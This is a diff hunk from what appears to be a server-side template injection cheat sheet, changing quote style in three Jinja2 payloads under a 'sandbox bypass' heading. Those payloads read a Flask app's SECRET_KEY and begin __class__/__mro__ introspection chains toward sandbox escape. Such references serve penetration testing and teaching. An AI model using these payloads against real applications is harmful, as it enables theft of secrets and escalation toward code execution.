@@ -88,9 +88,9 @@ Send: {{7*7}}
 ### Sandbox bypass when `.` is blocked
 
 ```python
-{{config['SECRET_KEY']}}
-{{''['__class__']['__mro__'][1]}}
-{{()|attr('__class__')}}
+{{config["SECRET_KEY"]}}
+{{""["__class__"]["__mro__"][1]}}
+{{() | attr("__class__")}}
 ```
 
 ---
